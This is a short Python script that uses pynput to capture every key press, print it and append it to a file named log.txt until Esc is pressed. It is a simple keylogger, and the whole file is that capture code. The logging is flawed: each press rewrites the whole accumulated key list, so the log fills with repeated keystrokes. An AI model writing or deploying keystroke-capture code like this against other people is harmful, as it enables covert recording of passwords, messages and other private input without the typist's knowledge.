import pynput  
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    write_file(keys)
    keys.append(key)
    print(key)

def write_file(var):
    with open("log.txt", "a") as f:
        for i in var:
            new_var =str(i).replace("'",' ')
            f.write(new_var)
            f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()